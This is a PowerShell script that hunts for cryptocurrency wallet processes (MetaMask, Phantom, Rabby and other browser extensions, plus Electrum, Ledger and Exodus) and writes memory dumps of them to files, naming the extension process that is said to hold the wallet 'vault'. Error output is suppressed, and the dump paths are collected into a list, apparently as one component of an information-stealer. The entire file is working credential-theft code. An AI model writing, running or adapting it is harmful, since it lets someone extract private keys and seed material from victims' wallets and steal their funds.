param(
    [Parameter(Mandatory = $true)][string]$Name,
    [Parameter(Mandatory = $true)][string]$Target,
    [Parameter(Mandatory = $true)][string]$OutDir,
    [Parameter(Mandatory = $true)][string]$OutList,
    [string]$Tag = ''
)

$ErrorActionPreference = 'SilentlyContinue'
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null
$utf8 = New-Object -TypeName System.Text.UTF8Encoding -ArgumentList $false

function Add-Line([string]$value) {
    [IO.File]::AppendAllText($OutList, $value + [Environment]::NewLine, $utf8)
}

Add-Type @'
using System;
using System.Runtime.InteropServices;
public static class SpcDump {
    [DllImport("dbghelp.dll")] public static extern bool MiniDumpWriteDump(
        IntPtr process, uint pid, IntPtr file, uint type, IntPtr exception,
        IntPtr user, IntPtr callback);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(
        uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr handle);
}
'@

function Get-SafeProcess([int]$processId) {
    try { return Get-Process -Id $processId } catch { return $null }
}

$candidates = @()
if ($Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')) {
    # Browser extensions run in an extension renderer, never in the browser main process.
    $all = @(Get-CimInstance Win32_Process)
    $root = 0
    if ($Target -match '^\d+$') {
        $selected = $all | Where-Object { $_.ProcessId -eq [int]$Target }
        if ($selected -and $selected.Name -match '(?i)chrome|msedge|brave') {
            $root = [int]$Target
        } elseif ($selected -and $selected.Name -match '(?i)firefox|librewolf|waterfox') {
            # Firefox extension code runs in a content process; the vault lives
            # in the browser parent, so never treat the content child as root.
            if ($selected.CommandLine -match '-contentproc') {
                $root = [int]$selected.ParentProcessId
            } else {
                $root = [int]$Target
            }
        } elseif ($selected) {
            # The foreground window may be the extension popup renderer itself;
            # its extension siblings (the ones holding the vault) hang off the browser.
            $parent = $all | Where-Object { $_.ProcessId -eq [int]$selected.ParentProcessId }
            if ($parent -and $parent.Name -match '(?i)chrome|msedge|brave|firefox|librewolf|waterfox') {
                $root = [int]$parent.ProcessId
            }
        }
    }
    $roots = @()
    if ($root -gt 0) {
        $roots = @($root)
    } else {
        $roots = @($all | Where-Object {
            $_.Name -match '(?i)chrome|msedge|brave|firefox|librewolf|waterfox'
        } | Select-Object -ExpandProperty ProcessId)
    }
    $firefox = @($all | Where-Object {
        $_.ProcessId -in $roots -and $_.Name -match '(?i)firefox|librewolf|waterfox'
    })
    if ($firefox.Count -gt 0) {
        # Firefox has no --extension-process; content processes hold the JS heap.
        $extension = @($all | Where-Object {
            $_.ParentProcessId -in $roots -and $_.CommandLine -match '-contentproc'
        })
        if ($extension.Count -eq 0) {
            $extension = $firefox
        }
    } else {
        $extension = @($all | Where-Object {
            $_.ParentProcessId -in $roots -and $_.CommandLine -match '--extension-process'
        })
        if ($extension.Count -eq 0) {
            $extension = @($all | Where-Object {
                $_.ParentProcessId -in $roots -and $_.CommandLine -match '--type=renderer'
            })
        }
    }
    if ($Target -match '^\d+$') {
        $self = $all | Where-Object { $_.ProcessId -eq [int]$Target }
        if ($self -and $self.CommandLine -match '--type=renderer') {
            $extension = @($self) + $extension
        }
    }
    foreach ($item in $extension) {
        $process = Get-SafeProcess ([int]$item.ProcessId)
        if ($process) { $candidates += $process }
    }
} elseif ($Target -match '^\d+$') {
    $process = Get-SafeProcess ([int]$Target)
    if ($process) { $candidates += $process }
} else {
    $filtered = Get-CimInstance Win32_Process | Where-Object {
        if ($Name -eq 'electrum') {
            $_.Name -match '(?i)^electrum' -or ($_.Name -match '(?i)^python' -and $_.CommandLine -match '(?i)electrum')
        } elseif ($Name -eq 'ledger') {
            $_.Name -match '(?i)^ledger'
        } elseif ($Name -eq 'exodus') {
            $_.Name -match '(?i)^exodus'
        } elseif ($Name -eq 'metamask' -or $Name -eq 'rabby') {
            $_.CommandLine -match '--extension-process'
        } else {
            $_.Name -match "(?i)$Name"
        }
    }
    foreach ($item in $filtered) {
        $process = Get-SafeProcess ([int]$item.ProcessId)
        if ($process) { $candidates += $process }
    }
}

$isBrowser = $Name -in @('phantom', 'metamask', 'rabby', 'trust', 'coinbase')
# Browsers get a single copy: the extension vault lives in the largest content
# process that fits, and a second ~190 MB dump adds little under a single
# attempt. Desktop wallets keep the historical two candidates.
$maxDumps = if ($isBrowser) { 1 } else { 2 }

$seen = @{}
$dumpedCount = 0
$bigReported = $false
foreach ($process in ($candidates | Sort-Object WorkingSet64 -Descending)) {
    if ($seen.ContainsKey($process.Id)) { continue }
    $seen[$process.Id] = 1
    if ($dumpedCount -ge $maxDumps) { break }

    $size = [int64]$process.WorkingSet64
    if ($size -gt 1610612736) {
        # Try the next, smaller content process before giving up.
        if (-not $bigReported) {
            Add-Line ("BIG|{0}|{1}" -f $process.Id, [int]($size / 1MB))
            $bigReported = $true
        }
        continue
    }

    # stdout reaches agent.log: the pid, size and whether this is a Firefox
    # content process are what the diagnostic asks for.
    $child = 'main'
    if ($isBrowser) {
        $info = Get-CimInstance Win32_Process -Filter "ProcessId = $($process.Id)"
        if ($info -and $info.CommandLine -match '-contentproc') { $child = 'contentproc' }
        elseif ($info -and $info.CommandLine -match '--extension-process') { $child = 'extension' }
    }
    [Console]::Out.WriteLine("TARGET|{0}|{1}|{2}|{3}" -f $process.Id, $process.ProcessName, [int]($size / 1MB), $child)
    $prefix = if ($Tag) { "wallet-$Tag-$Name" } else { "wallet-$Name" }
    $path = Join-Path $OutDir ("{0}-{1}-{2}.dmp" -f $prefix, $process.Id, (Get-Date -Format yyyyMMddHHmmss))
    $handle = [SpcDump]::OpenProcess(0x0410, $false, [uint32]$process.Id)
    if ($handle -eq [IntPtr]::Zero) { continue }
    $stream = [IO.File]::Create($path)
    $ok = [SpcDump]::MiniDumpWriteDump($handle, [uint32]$process.Id,
        $stream.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    $stream.Close()
    [SpcDump]::CloseHandle($handle)
    if ($ok) {
        Add-Line $path
        $dumpedCount++
    } else {
        Remove-Item -LiteralPath $path -Force
    }
}
